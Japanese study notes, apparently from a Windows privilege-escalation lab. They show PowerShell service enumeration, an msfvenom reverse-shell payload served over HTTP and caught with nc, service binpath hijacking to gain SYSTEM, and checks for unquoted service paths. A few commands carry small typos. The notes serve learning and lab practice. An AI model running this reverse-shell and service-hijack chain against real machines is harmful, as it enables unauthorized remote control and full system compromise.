# WinPrev

## Powershell基礎

- linuxのwhich

```ps1
get-command xxxxx
```

- サービスの一覧。これだけだとあまり意味がないので、後の `get-wmiobject win32_service` を使用した方がいい。

```ps1
sc.exe 
```

- 特定サービスの設定の確認
`sc.exe` は、windowsサービスを管理・操作するもの。Powershellで、`sc` を実行すると、 Powershellの `set content` が起動されるので、必ず、`.exe` をつける。
`qc` は、query config。

```ps1
sc.exe qc xxxxxxx
```

- サービス一覧。（get-wmiobject win32_service)を使用して細かくクエリーを投げる。

```ps1
get-wmiobject win32_service | {ここにクエリー} | select ここに取得したい項目
```

- get-wmiobject win32_serviceにどのような項目があるのか？

```
get-wmiobject win32_service | get-member -membertype property

Name                    MemberType Definition
----                    ---------- ----------
AcceptPause             Property   bool AcceptPause {get;set;}
AcceptStop              Property   bool AcceptStop {get;set;}
Caption                 Property   string Caption {get;set;}
(省略・・・)
```

- 取得したい項目を指定

```ps1
get-wmiobject win32_service | select Name, StartName, PathName

name                                     pathname
----                                     --------
AJRouter                                 C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
ALG                                      C:\Windows\System32\alg.exe
(省略・・・)
```

## ペイロード作成

### reverse shellを作成してncで待ち受け

AttackPC: ペイロード作成

```
msfvenom -p Windows/x64/shell_reverse_tcp lhost=10.10.10.10 lport=443 -f exe -o reverse.exe
```

AttackPC: webサーバー起動

```
/usr/bin/python3 -m http.server 80
```

AttackPC: 待受けポート開放

```
nc -lvpn 443
listening on [any] 443 ...
```


TargetPC: ペイロードダウンロード

```ps1
Invoke-WebRequest http://10.10.10.10/reverse.exe -OutFile reverse.exe
```

TargetPC: 実行

```
./reverse.exe
```

AttackPC: シェル獲得

```
connect to [10.10.10.10] from (UNKNOWN) [10.49.181.24] 49918
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\PrivEsc>
```

## 権限昇格ネタ

- PrivEscで、意味のあるサービス一覧の見方

1. PrivEsc で「意味がある」サービス一覧を取得

全部のサービスを見ても意味はない。

- 見るべきポイント
  - LocalSystem で動く
  - ImagePath が怪しい（Program Files 以外など）
  - 手動起動できる

- PowerShell で条件付き一覧

```ps1
PS> Get-WmiObject Win32_Service |
Where-Object {
  $_.StartName -eq "LocalSystem"
} |
Select-Object Name, StartMode, StartName, PathName
```

2.  「怪しいパス」だけ抽出する

`C:\PrivEsc\reverse.exe` のようなものが引っかかる

```ps1
Get-WmiObject Win32_Service |
Where-Object {
    $_.StartName -eq "LocalSystem" -and
    $_.PathName -notmatch "Windows|System32"
} |
Select Name, PathName

Name           PathName
----           --------
AmazonSSMAgent "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
AWSLiteAgent   C:\Program Files\Amazon\XenTools\LiteAgent.exe
daclsvc        "C:\Program Files\DACL Service\daclservice.exe"
dllsvc         "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
filepermsvc    "C:\Program Files\File Permissions Service\filepermservice.exe"
regsvc         "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
unquotedsvc    C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
winexesvc      winexesvc.exe
```

3. accesschk と組み合わせる流れ

  - 一覧で怪しいサービスを見つける
  - 1個ずつ深掘りする

```ps1
PS> sc.exe qc daclsvc
SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe" #実行ファイル
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem #SYSTEM権限で起動される
```


  - daclsvcというサービスに、自分自身にはどんな権限がついているか？
  - もしかして実行ファイルのパスの設定を変えられたりしないか？
  - startさせる権限もあったりしないか？

```ps1
PS> accesschk.exe -wuvc user daclsvc
```

  - 変えられる場合、変えてしまう。実行できるなら実行してしまう。

```ps1
sc.exe config daclsvc binpath="\C:\temp\reverse.exe"
net.exe start daclsvc
```

## ベクトル別

### 過剰な権限が付与されているサービスはないか？（自分が設定変更したり、実行出来たり）

1. サービスの調査

以下のポイントでチェック
- LocalSystem で動く
- ImagePath が怪しい（Program Files 以外など）
- 手動起動できる
- パスが怪しい

```ps1
PS C:\PrivEsc> get-wmiobject win32_service | where-object { $_.startname -eq "LocalSystem" -and $_.PathName -notmatch "Windows|Sytem32"} | select-object Name, StartMode, StartName, PathName

Name           StartMode StartName   PathName
----           --------- ---------   --------
AmazonSSMAgent Auto      LocalSystem "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
AWSLiteAgent   Auto      LocalSystem C:\Program Files\Amazon\XenTools\LiteAgent.exe
daclsvc        Manual    LocalSystem "C:\Program Files\DACL Service\daclservice.exe"
dllsvc         Manual    LocalSystem "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
filepermsvc    Manual    LocalSystem "C:\Program Files\File Permissions Service\filepermservice.exe"
regsvc         Manual    LocalSystem "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
unquotedsvc    Manual    LocalSystem C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
winexesvc      Manual    LocalSystem winexesvc.exe
```

2. 各サービスに対する自分の権限チェック

Sysinternalsの、accesschk.exeを使用。`SERVICE_CHANGE_COUNFIG` などserviceの設定変更に権限がある。この場合PrivEscに利用できる。

```ps1
PS> .\accesschk.exe /accepteula -cvquw ユーザー名 daclsvc

RW daclsvc
SERVICE_QUERY_STATUS
SERVICE_QUERY_CONFIG
SERVICE_CHANGE_CONFIG
SERVICE_INTERROGATE
SERVICE_ENUMERATE_DEPENDENTS
SERVICE_START
SERVICE_STOP
READ_CONTROL
```

3. query configで設定の状況をみてみる。

```ps1
PS> sc.exe qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

4. 起動ファイルを書き換えて実行する。

`BINARY_PATH_NAME` の値を書き換えて（先ほど編集権限がついてた）、手動でサービスを起動（同じくSTART権限もついてた）する。
実行するファイルは、AttackPCに接続するペイロード。

```ps1
PS> sc.exe config daclsvc binpath="C:\PrivEsc\reverse.exe"

PS> net.exe start daclsvc
```


### サービスの実行パスにクォートされていない空白が含まれていないか？

1. サービス一覧

```ps1
PS1> Get-WmiObject Win32_Service |
Where-Object {
    $_.StartName -eq "LocalSystem" -and
    $_.PathName -notmatch "Windows|System32"
} |
Select Name, PathName

Name           PathName
----           --------
AmazonSSMAgent "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"
AWSLiteAgent   C:\Program Files\Amazon\XenTools\LiteAgent.exe
daclsvc        "C:\Program Files\DACL Service\daclservice.exe"
dllsvc         "C:\Program Files\DLL Hijack Service\dllhijackservice.exe"
filepermsvc    "C:\Program Files\File Permissions Service\filepermservice.exe"
regsvc         "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
unquotedsvc    C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
winexesvc      winexesvc.exe
```

2. 以下がクォートされていない

```ps1
AWSLiteAgent   C:\Program Files\Amazon\XenTools\LiteAgent.exe
unquotedsvc    C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
```

3. 空白が存在するパスの親ディレクトリへの書き込み権限はあるか？

accesschkでの検証だと、ACLのチェックしかしない。しかし実際は、ACL以外にもUACや他の機構も関連している。なので、これだけでは判断が無理。 

```ps1
./accesschk.exe -uvq "C:"
```

結局、echoで試すのが確実。以下のようにディレクトリを指定して、そこにhoge.txtが作成できたらナイス！

```ps1
echo hoge > "C:\hoge.txt"
```

`icacls` もお勧め。末尾の、`\`があるとうまく判定できないので注意。
F=Full M=Modify W=Write RX=読み、実行 DENY=明示拒否

```ps1
icacls "C:"
```

